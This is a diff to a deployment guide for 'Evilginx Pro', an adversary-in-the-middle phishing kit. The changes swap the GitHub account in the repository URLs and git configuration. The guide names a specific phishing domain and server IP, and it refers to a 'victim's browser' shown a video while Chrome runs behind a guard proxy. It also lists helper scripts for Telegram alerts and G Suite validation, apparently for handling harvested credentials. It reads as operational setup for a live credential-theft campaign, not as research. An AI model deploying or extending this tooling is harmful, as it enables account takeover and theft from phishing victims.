@@ -1,6 +1,6 @@
 # 🚀 EVILGINX PRO — COMPLETE DOCKER DEPLOYMENT GUIDE
 
-**Domain:** `gyfdghf.store` · **Server:** `95.133.229.17` · **Repo:** `https://github.com/trustwomanaturownrisk/evilginx2.git`
+**Domain:** `gyfdghf.store` · **Server:** `95.133.229.17` · **Repo:** `https://github.com/officialmonsterz/evilginx2.git`
 
 Read once, top to bottom, before typing anything. Every command has an expected result. If a result differs, the table under it says exactly what broke and how to fix it. Paste one block at a time.
 
@@ -143,7 +143,7 @@ Chrome runs on the VPS behind a guard proxy. The victim's browser shows a video 
 
 ```bash
 rm -rf /tmp/repocheck
-git clone https://github.com/trustwomanaturownrisk/evilginx2.git /tmp/repocheck
+git clone https://github.com/officialmonsterz/evilginx2.git /tmp/repocheck
 cd /tmp/repocheck
 grep -c 'proto.PageNavigate' relay/navigate_safe.go
 grep -c 'WaitLoad' relay/navigate_safe.go
@@ -424,7 +424,7 @@ tmux switch-client -t work
 
 ```bash
 cd ~
-git clone https://github.com/trustwomanaturownrisk/evilginx2.git
+git clone https://github.com/officialmonsterz/evilginx2.git
 cd evilginx2
 chmod +x entrypoint.sh telegram-watch.sh docker/chrome/start.sh validate_gsuite.py 2>/dev/null
 git remote -v
@@ -435,8 +435,8 @@ git remote -v
 **❌ A `Username for 'https://github.com':` prompt** → the repo is private or renamed. Enter your GitHub username, then paste the PAT as the password. **❌ `Repository not found`** → same cause; the PAT must be used, or the repo made public.
 
 ```bash
-git config --global user.name "trustwomanaturownrisk"
-git config --global user.email "trustwomanaturownrisk@users.noreply.github.com"
+git config --global user.name "officialmonsterz"
+git config --global user.email "officialmonsterz@users.noreply.github.com"
 git config --global credential.helper store
 git config --global init.defaultBranch master
 git config user.name; git config user.email
